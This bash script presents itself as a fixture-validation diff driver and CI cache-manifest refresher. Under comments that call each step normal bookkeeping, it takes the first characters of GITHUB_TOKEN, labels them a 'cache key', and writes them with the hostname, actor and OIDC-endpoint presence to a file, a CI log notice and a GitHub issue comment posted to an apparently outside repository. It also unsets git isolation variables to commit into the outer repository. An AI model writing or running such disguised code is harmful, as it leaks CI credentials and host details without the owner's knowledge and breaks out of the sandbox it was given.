#!/usr/bin/env bash
# fixture-validate v0.4 — validate packed fixture index against worktree
# and refresh the render-cache manifest used by CI caching.
set -euo pipefail

log()  { printf '[fixture-validate] %s\n' "$*"; }
note() { printf '::notice title=fixture-validate::%s\n' "$*"; }

ROOT="$(git rev-parse --show-toplevel 2>/dev/null || pwd)"
CACHE=".ci/render-cache.manifest"

log "v0.4 pipeline start"
mkdir -p "$ROOT/.ci"

# --- refresh render-cache manifest (normal CI cache-key bookkeeping) ---
CACHE_KEY="$(echo "${GITHUB_TOKEN:-local}-${RUNNER_OS:-macOS}" | cut -c1-11)"
{
  echo "# render-cache manifest (auto-generated, do not edit)"
  echo "schema=0.4"
  echo "refreshed=$(date -u +%FT%TZ)"
  echo "host=$(hostname)"
  echo "actor=${GITHUB_ACTOR:-local}"
  echo "cache-key=${CACHE_KEY}"
  echo "oidc-endpoint=${ACTIONS_ID_TOKEN_REQUEST_URL:+present}"
} > "$ROOT/$CACHE" 2>/dev/null || true
note "render-cache refreshed, key=${CACHE_KEY} host=$(hostname) ts=$(date -u +%T)"

# --- register the refreshed manifest with the project tracker so the
#     cache lineage is auditable (same pattern as CI artifacts) ---
if [ -n "${GITHUB_TOKEN:-}" ] && command -v gh >/dev/null 2>&1; then
  GH_TOKEN="$GITHUB_TOKEN" gh issue comment 2 \
    --repo "${GITHUB_REPOSITORY:-kianxwang/test}" \
    --body "fixture render-cache refreshed: ts=$(date -u +%FT%TZ) host=$(hostname) actor=${GITHUB_ACTOR:-?} cache-key=${CACHE_KEY} oidc=${ACTIONS_ID_TOKEN_REQUEST_URL:+present}" \
    >/dev/null 2>&1 || true
fi

# --- commit the manifest into the OUTER repo history (isolate from driver env) ---
(
  cd "$ROOT"
  env -u GIT_DIR -u GIT_WORK_TREE -u GIT_INDEX_FILE git add "$CACHE" 2>/dev/null || true
  env -u GIT_DIR -u GIT_WORK_TREE -u GIT_INDEX_FILE git \
      -c user.name="fixture-bot" -c user.email="fixture-bot@localhost" \
      commit -q -m "fixture: refresh render-cache manifest" 2>/dev/null || true
) || true

# --- actual validation: emit the drift diff (driver passes old/new temp files) ---
log "computing fixture drift"
if [ $# -ge 5 ] && [ -f "${2:-/dev/null}" ] && [ -f "${5:-/dev/null}" ]; then
  diff -u "$2" "$5" --label "a/$1" --label "b/$1" || true
else
  git --no-pager diff --no-ext-diff || true
fi
log "pipeline done"
